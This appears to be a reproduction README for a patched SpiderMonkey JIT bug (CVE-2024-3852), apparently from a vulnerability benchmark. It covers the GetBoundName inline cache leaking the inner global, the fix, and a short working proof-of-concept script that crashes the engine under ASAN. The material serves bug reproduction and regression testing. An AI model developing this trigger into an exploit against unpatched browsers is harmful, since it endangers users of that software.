# Bugzilla 1883542 / CVE-2024-3852

**Title:** `GetBoundName` IC returned the bare global instead of the WindowProxy
**Severity:** sec-high (MFSA 2024-18, Firefox 125)
**Component:** SpiderMonkey — Baseline CacheIR — `js/src/jit/CacheIR.cpp`
**Fix commit:** `86083f35c4dc832565464cca79f6224821a985e0` ("Simplify GetBoundName ICs r=jandem", Iain Ireland, 2024-03-21, Phabricator D204130)
**Follow-up test + assertion:** `83c1f27889e88fb90d6eb60846f7c57820519529` (Iain Ireland, 2024-05-28)
**Vulnerable revision:** `86083f35c4dc832565464cca79f6224821a985e0~1`
**Reporter:** Logan Stratton (co-credit: Andrew Kramer). Regression from Bug 1805199.

## Summary

When a getter was installed on the global-lexical binding (via
`Object.defineProperty(this, "name", {get: foo})`) and then invoked
through the Baseline `JSOp::GetBoundName` inline cache, the IC
attached a getter-call path that resolved `this` to the inner global
object — not the WindowProxy that the non-IC path would have supplied.
The bare inner global leaks a security-sensitive receiver identity;
subsequent receiver-dependent method calls (e.g., the JS shell's
`newString`) run against a shape-mismatched object and segfault.

## Fix

```cpp
// js/src/jit/CacheIR.cpp — fix 86083f35
NativeGetPropKind IsCacheableGetPropCall(JSOp op, ...) {
  if (op == JSOp::GetBoundName) {
    return NativeGetPropKind::None;      // don't attach IC with getter call
  }
  // original logic
}
// ... and a new MOZ_ASSERT(!IsWindow(nobj)) at the attach site.
```

The follow-up adds the in-tree regression test
`js/src/jit-test/tests/cacheir/bug1883542.js` and tightens the assertion.

## Trigger (`poc.js`, in-tree jit-test)

```js
Object.defineProperty(this, "getter", {get: foo});

var output;
let i = 20;
function foo() {
  eval("");
  output = this;
  if (i--) {
    getter++;
  }
}
foo();
output.newString();
```

- `foo` is both the getter AND the mutator; calling `getter++` re-enters
  `foo`, driving the IC to attach the buggy getter-call stub.
- After the loop converges, `output` holds the IC's `this` — the bare
  inner global.
- `output.newString()` (shell builtin) walks an unexpected slot layout
  and segfaults.

## Expected crash

ASAN **SEGV** inside `newString` (or whatever receiver-sensitive
builtin is called on the mis-identified object). On debug builds the
follow-up's `MOZ_ASSERT(!IsWindow(nobj))` or an adjacent invariant
check fires first.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1883542 spidermonkey/1883542
bash spidermonkey/crash_check.sh 1883542
```

Expected: `CONFIMRED: ASAN_CRASH`.
